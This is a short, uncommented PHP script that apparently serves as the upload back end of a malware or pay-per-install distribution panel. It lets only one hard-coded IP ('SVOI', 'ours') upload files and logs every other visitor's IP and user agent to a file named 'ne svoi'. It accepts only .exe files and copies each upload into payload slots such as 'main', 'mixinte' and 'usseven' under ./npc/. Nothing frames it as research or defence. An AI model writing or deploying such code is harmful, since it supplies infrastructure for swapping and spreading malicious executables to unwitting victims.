<?php
date_default_timezone_set('Europe/Moscow');
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
 
if(filter_var($client, FILTER_VALIDATE_IP)) $ip = $client;
elseif(filter_var($forward, FILTER_VALIDATE_IP)) $ip = $forward;
else $ip = $remote;

$date = date("H:i d-m-y");

if ($ip == '109.234.35.187') $ip = 'SVOI';
else {
    echo 'whats problem?';
    file_put_contents('loads/ne svoi', $date . $ip . ' [' . $_SERVER["HTTP_USER_AGENT"] . '] ' . $pub . PHP_EOL, FILE_APPEND);
    return 1;
}

$uploaddir = './';
$uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']);

if(substr($_FILES["uploadfile"]["name"], -4) !== ".exe") {
	echo "error";
	exit();
}
	
$tmp_name = $_FILES["uploadfile"]["tmp_name"];
$check = @$_GET['check'];
if ($check == 'main')
    copy($tmp_name,"./npc/main");

if ($check == 'mixinte')
    copy($tmp_name,"./npc/mixinte");
    
if ($check == 'mixazed')
    copy($tmp_name,"./npc/mixazed");
    
if ($check == 'mixruzki')
    copy($tmp_name,"./npc/mixruzki");
    
if ($check == 'mixnull')
    copy($tmp_name,"./npc/mixnull");
    
if ($check == 'mixskith')
    copy($tmp_name,"./npc/mixskith");
    
if ($check == 'mixseven')
    copy($tmp_name,"./npc/mixseven");
    
if ($check == 'usseven')
    copy($tmp_name,"./npc/usseven");
    
if ($check == 'mixeight')
    copy($tmp_name,"./npc/mixeight");
    
if ($check == 'mixfive')
    copy($tmp_name,"./npc/mixfive");

if ($check == 'mixshop')
    copy($tmp_name,"./npc/mixshop");
    
if ($check == 'mixkis')
    copy($tmp_name,"./npc/mixkis");
    
if ($check == 'mixhb')
    copy($tmp_name,"./npc/mixhb");

echo "done";
?>